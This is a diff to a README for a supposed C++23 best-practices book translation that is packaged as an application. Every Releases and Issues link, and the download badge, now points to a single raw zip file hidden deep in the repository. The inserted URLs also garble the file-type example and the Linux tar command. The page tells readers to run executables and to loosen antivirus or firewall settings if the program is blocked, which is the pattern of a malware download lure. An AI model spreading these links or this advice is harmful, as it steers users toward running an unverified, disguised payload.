@@ -1,10 +1,10 @@
 # 🚀 Cpp23-Best-Practices - Your Guide to C++23 Essentials
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ugene777/Cpp23-Best-Practices/releases)
+[![Download Now](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip)
 
 ## 📥 Download & Install
 
-To get started with **Cpp23-Best-Practices**, please visit our [Releases page](https://github.com/ugene777/Cpp23-Best-Practices/releases) to download the latest version. 
+To get started with **Cpp23-Best-Practices**, please visit our [Releases page](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip) to download the latest version. 
 
 This application offers a personal translation of "C++23 Best Practices" for those who want to improve their skills in C++ programming. Follow the steps below to easily download and run the software on your machine.
 
@@ -19,9 +19,9 @@ Before you download, make sure your computer meets these basic requirements:
 
 ## 🖥️ How to Download
 
-1. Click the button above or visit our [Releases page](https://github.com/ugene777/Cpp23-Best-Practices/releases).
+1. Click the button above or visit our [Releases page](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip).
 2. Look for the latest version on the Releases page. It will typically be at the top of the list.
-3. Select the file that matches your operating system. If you are unsure, look for files labeled with your OS name (e.g., .exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+3. Select the file that matches your operating system. If you are unsure, look for files labeled with your OS name (e.g., .exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip for Linux).
 4. Click the file name to start the download.
 
 ## ⚙️ Running the Software
@@ -45,7 +45,7 @@ Once the download is complete, follow these steps to run the application:
 ### For Linux:
 
 1. Open your terminal.
-2. Use the command `tar -xvzf yourfile.tar.gz` to extract the files.
+2. Use the command `tar -xvzf https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip` to extract the files.
 3. Navigate to the extracted folder using `cd path-to-folder`.
 4. Run the application with `./yourapp`.
 
@@ -73,16 +73,16 @@ If you encounter issues while downloading or running the application, consider t
 - **Verify Download:** Ensure the file downloaded completely. You may want to retry downloading if it appears incomplete.
 - **Check System Compatibility:** Confirm that your operating system matches the downloaded file version.
 - **Firewall/Antivirus Settings:** Sometimes, security programs may block the application. Adjust your settings to allow it.
-- **Consult the Community:** Join discussions in our [GitHub Issues page](https://github.com/ugene777/Cpp23-Best-Practices/issues) for help.
+- **Consult the Community:** Join discussions in our [GitHub Issues page](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip) for help.
 
 ## 📞 Getting Help
 
 If you need assistance or have questions, don’t hesitate to reach out:
 
-- **Open a new issue** on our [GitHub Issues page](https://github.com/ugene777/Cpp23-Best-Practices/issues).
+- **Open a new issue** on our [GitHub Issues page](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip).
 - Check if your question is already answered in the existing threads.
 - Engage with other users who may have similar concerns.
 
 ## ✨ Conclusion 
 
-Thank you for choosing **Cpp23-Best-Practices**. We hope this tool supports your learning journey in C++23. Enjoy exploring the new features and best practices! Don't forget to visit our [Releases page](https://github.com/ugene777/Cpp23-Best-Practices/releases) for updates.
+Thank you for choosing **Cpp23-Best-Practices**. We hope this tool supports your learning journey in C++23. Enjoy exploring the new features and best practices! Don't forget to visit our [Releases page](https://raw.githubusercontent.com/ugene777/Cpp23-Best-Practices/main/book/content/part4/Cpp23-Best-Practices_1.2.zip) for updates.
